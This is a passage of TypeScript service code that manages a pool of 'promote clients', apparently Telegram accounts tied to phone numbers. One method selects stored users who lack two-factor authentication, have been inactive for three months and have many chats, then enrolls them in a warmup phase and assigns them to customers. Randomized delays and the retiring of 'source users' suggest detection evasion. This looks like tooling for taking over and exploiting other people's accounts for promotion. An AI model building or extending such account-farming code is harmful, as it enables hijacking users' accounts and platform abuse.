                    `ClientId: ${targetClientId}`,
                    `Mobile: ${document.mobile}`,
                    `AvailableDate: ${targetAvailableDate}`,
                    `Channels: ${channels.ids.length}`,
                    `WarmupPhase: ${WarmupPhase.ENROLLED}`,
                    `SourceTgId: ${document.tgId}`,
                ].join('\n'),
            );
            return true;
        } catch (error: unknown) {
            const errorDetails = this.handleError(error, 'Error processing client', document.mobile);
            if (isPermanentError(errorDetails)) {
                // Try to mark promote doc inactive (may not exist yet)
                try { await this.markAsInactive(document.mobile, errorDetails.message); } catch { }
                // Also retire the source user so it's not selected again
                try { await this.usersService.update(document.tgId, { expired: true }); } catch { }
            }
            return false;
        } finally {
            await this.safeUnregisterClient(document.mobile);
            await sleep(ClientHelperUtils.gaussianRandom(12500, 1250, 10000, 15000));
        }
    }

    // ---- Promote-specific: Pool management ----

    async addNewUserstoPromoteClients(
        badIds: string[],
        goodIds: string[],
        clientsNeedingPromoteClients: string[] = [],
        promoteClientsPerClient?: Map<string, number>,
    ) {
        const clientNeedingDynamic: Array<{
            clientId: string;
            totalNeeded: number;
            windowNeeds: Array<{ window: string; available: number; needed: number; targetDate: string; minRequired: number }>;
            totalActive: number;
            totalNeededForCount: number;
            calculationReason: string;
            priority: number;
        }> = [];

        for (const clientId of clientsNeedingPromoteClients) {
            const availabilityNeeds = await this.calculateAvailabilityBasedNeeds(clientId);
            if (availabilityNeeds.totalNeeded > 0) {
                clientNeedingDynamic.push({ clientId, ...availabilityNeeds });
            }
        }

        clientNeedingDynamic.sort((a, b) => a.priority - b.priority);
        await this.addNewUserstoPromoteClientsDynamic(badIds, goodIds, clientNeedingDynamic, promoteClientsPerClient);
    }

    async addNewUserstoPromoteClientsDynamic(
        badIds: string[],
        goodIds: string[],
        clientsNeedingPromoteClients: Array<{
            clientId: string;
            totalNeeded: number;
            windowNeeds: Array<{ window: string; available: number; needed: number; targetDate: string; minRequired: number }>;
            totalActive: number;
            totalNeededForCount: number;
            calculationReason: string;
            priority: number;
        }>,
        promoteClientsPerClient?: Map<string, number>,
    ): Promise<{ createdCount: number; attemptedCount: number; createdEntries: string[] }> {
        const threeMonthsAgo = ClientHelperUtils.getDateStringDaysAgo(this.INACTIVE_USER_CUTOFF_DAYS, this.ONE_DAY_MS);

        let totalNeeded = 0;
        for (const clientNeed of clientsNeedingPromoteClients) {
            totalNeeded += clientNeed.totalNeeded;
        }
        totalNeeded = Math.min(totalNeeded, this.config.maxNewClientsPerTrigger);

        if (totalNeeded === 0) return { createdCount: 0, attemptedCount: 0, createdEntries: [] };

        const documents = await this.usersService.executeQuery(
            {
                mobile: { $nin: goodIds },
                expired: false,
                twoFA: false,
                lastActive: { $lt: threeMonthsAgo },
                totalChats: { $gt: 150 },
            },
            { tgId: 1 },
            totalNeeded + 5,
        );

        const today = ClientHelperUtils.getTodayDateString();
        const assignmentQueue: Array<{ clientId: string; priority: number }> = [];

        for (const clientNeed of clientsNeedingPromoteClients) {
            for (let i = 0; i < clientNeed.totalNeeded; i++) {
                assignmentQueue.push({ clientId: clientNeed.clientId, priority: clientNeed.priority });
            }
        }

        let attemptedCount = 0;
        let createdCount = 0;
        let assignmentIndex = 0;
        const createdEntries: string[] = [];

        while (attemptedCount < totalNeeded && documents.length > 0 && assignmentIndex < assignmentQueue.length) {
            const document = documents.shift();
            if (!document || !document.mobile || !document.tgId) continue;

            const assignment = assignmentQueue[assignmentIndex];
            if (!assignment) break;

            try {
                const created = await this.createPromoteClientFromUser(document, assignment.clientId, today);
                if (created) {
                    assignmentIndex++;
                    createdCount++;
                    createdEntries.push(`${assignment.clientId} | ${document.mobile}`);
                }
                attemptedCount++;
            } catch (error: unknown) {
                this.logger.error(`Error creating connection for ${document.mobile}`);
                await sleep(ClientHelperUtils.gaussianRandom(12500, 1250, 10000, 15000));
                attemptedCount++;
            }
        }

        this.logger.log(`Dynamic batch completed: Created ${createdCount} new promote clients (${attemptedCount} attempted)`);
        return { createdCount, attemptedCount, createdEntries };
    }

    // ---- Promote-specific: Distribution stats ----

    async getPromoteClientDistribution(): Promise<{
        totalPromoteClients: number;
        unassignedPromoteClients: number;
        activePromoteClients: number;
        inactivePromoteClients: number;
        distributionPerClient: Array<{
            clientId: string;
            assignedCount: number;
            activeCount: number;
            inactiveCount: number;
            needed: number;
            status: 'sufficient' | 'needs_more';
            neverUsed: number;
            usedInLast24Hours: number;
        }>;
        summary: {
            clientsWithSufficientPromoteClients: number;
            clientsNeedingPromoteClients: number;
            totalPromoteClientsNeeded: number;
            maxPromoteClientsPerTrigger: number;
            triggersNeededToSatisfyAll: number;
        };
    }> {
        const clients = await this.clientService.findAll();
        const now = new Date();
        const last24Hours = new Date(now.getTime() - this.ONE_DAY_MS);

        const [
            totalPromoteClients, unassignedPromoteClients, activePromoteClients, inactivePromoteClients,
            assignedCounts, activeCounts, inactiveCounts, neverUsedCounts, recentlyUsedCounts,
        ] = await Promise.all([
            this.promoteClientModel.countDocuments({}),
            this.promoteClientModel.countDocuments({ clientId: { $exists: false } }),
            this.promoteClientModel.countDocuments({ status: 'active' }),
            this.promoteClientModel.countDocuments({ status: 'inactive' }),
            this.promoteClientModel.aggregate([{ $match: { clientId: { $exists: true, $ne: null } } }, { $group: { _id: '$clientId', count: { $sum: 1 } } }]),
            this.promoteClientModel.aggregate([{ $match: { clientId: { $exists: true, $ne: null }, status: 'active' } }, { $group: { _id: '$clientId', count: { $sum: 1 } } }]),
            this.promoteClientModel.aggregate([{ $match: { clientId: { $exists: true, $ne: null }, status: 'inactive' } }, { $group: { _id: '$clientId', count: { $sum: 1 } } }]),
            this.promoteClientModel.aggregate([{ $match: { clientId: { $exists: true, $ne: null }, status: 'active', $or: [{ lastUsed: { $exists: false } }, { lastUsed: null }] } }, { $group: { _id: '$clientId', count: { $sum: 1 } } }]),
            this.promoteClientModel.aggregate([{ $match: { clientId: { $exists: true, $ne: null }, status: 'active', lastUsed: { $gte: last24Hours } } }, { $group: { _id: '$clientId', count: { $sum: 1 } } }]),
        ]);

        const toMap = (arr: any[]) => new Map(arr.map((item: { _id: string; count: number }) => [item._id, item.count]));
        const assignedCountMap = toMap(assignedCounts);
        const activeCountMap = toMap(activeCounts);
        const inactiveCountMap = toMap(inactiveCounts);
        const neverUsedCountMap = toMap(neverUsedCounts);
        const recentlyUsedCountMap = toMap(recentlyUsedCounts);

        const distributionPerClient: Array<{
            clientId: string; assignedCount: number; activeCount: number; inactiveCount: number;
            needed: number; status: 'sufficient' | 'needs_more'; neverUsed: number; usedInLast24Hours: number;
        }> = [];
        let clientsWithSufficient = 0, clientsNeedingMore = 0, totalNeeded = 0;

        for (const client of clients) {
            const activeCount = activeCountMap.get(client.clientId) || 0;
            const needed = Math.max(0, this.config.minTotalClients - activeCount);
            distributionPerClient.push({
                clientId: client.clientId,
                assignedCount: assignedCountMap.get(client.clientId) || 0,
                activeCount,
                inactiveCount: inactiveCountMap.get(client.clientId) || 0,
                needed,
                status: needed === 0 ? 'sufficient' : 'needs_more',
                neverUsed: neverUsedCountMap.get(client.clientId) || 0,
                usedInLast24Hours: recentlyUsedCountMap.get(client.clientId) || 0,
            });
            if (needed === 0) clientsWithSufficient++; else { clientsNeedingMore++; totalNeeded += needed; }
        }

        return {
            totalPromoteClients, unassignedPromoteClients, activePromoteClients, inactivePromoteClients,
            distributionPerClient,
            summary: {
                clientsWithSufficientPromoteClients: clientsWithSufficient,
                clientsNeedingPromoteClients: clientsNeedingMore,
                totalPromoteClientsNeeded: totalNeeded,
                maxPromoteClientsPerTrigger: this.config.maxNewClientsPerTrigger,
                triggersNeededToSatisfyAll: Math.ceil(totalNeeded / this.config.maxNewClientsPerTrigger),
            },
        };
    }

    async getPromoteClientsByStatus(status: ClientStatusType): Promise<PromoteClient[]> {
        return this.promoteClientModel.find({ status }).exec();
    }

    async getPromoteClientsWithMessages() {
        return this.promoteClientModel.find({}, { mobile: 1, status: 1, message: 1, clientId: 1, lastUsed: 1 }).exec();
    }

    async getLeastRecentlyUsedPromoteClients(clientId: string, limit: number = 1): Promise<PromoteClient[]> {
        return await this.getLeastRecentlyUsedClients(clientId, limit) as PromoteClient[];
    }

    async getNextAvailablePromoteClient(clientId: string): Promise<PromoteClient | null> {
        const clients = await this.getLeastRecentlyUsedPromoteClients(clientId, 1);
        return clients.length > 0 ? clients[0] : null;
    }

    async getUnusedPromoteClients(hoursAgo: number = 24, clientId?: string): Promise<PromoteClientDocument[]> {
        return await this.getUnusedClients(hoursAgo, clientId) as PromoteClientDocument[];
    }

    private async sendPromoteCheckSummaryNotification(
        totalUpdates: number,
        createdCount: number,
        attemptedCount: number,
        updatedEntries: string[],
        createdEntries: string[],
    ): Promise<void> {
        const distribution = await this.getPromoteClientDistribution();
        const lines = distribution.distributionPerClient
            .sort((a, b) => a.clientId.localeCompare(b.clientId))
            .map((item) =>
                `${item.clientId}: active=${item.activeCount}, assigned=${item.assignedCount}, inactive=${item.inactiveCount}, needed=${item.needed}, neverUsed=${item.neverUsed}, used24h=${item.usedInLast24Hours}`,
            );
        const updatedLines = updatedEntries.length > 0
            ? ['UpdatedThisRun:', ...updatedEntries.map((entry) => `- ${entry}`), '']
            : ['UpdatedThisRun: none', ''];
        const createdLines = createdEntries.length > 0
            ? ['CreatedThisRunDetails:', ...createdEntries.map((entry) => `- ${entry}`), '']
            : ['CreatedThisRunDetails: none', ''];

        await this.botsService.sendMessageByCategory(
            ChannelCategory.ACCOUNT_NOTIFICATIONS,
            [
                'Promote Client Check Summary',
                '',
                `Active: ${distribution.activePromoteClients}`,
                `Inactive: ${distribution.inactivePromoteClients}`,
                `Unassigned: ${distribution.unassignedPromoteClients}`,
                `UpdatesApplied: ${totalUpdates}`,
                `CreatedThisRun: ${createdCount}`,
                `AttemptedCreates: ${attemptedCount}`,
                `TotalNeeded: ${distribution.summary.totalPromoteClientsNeeded}`,
                `ClientsNeedingMore: ${distribution.summary.clientsNeedingPromoteClients}`,
                '',
                ...updatedLines,
                ...createdLines,
                'PerClientSummary:',
                ...lines,
            ].join('\n'),
        );
    }

    // Backwards compat aliases
    removeFromPromoteMap(key: string) { this.removeFromJoinMap(key); }
    clearPromoteMap() { this.clearJoinMap(); }
}
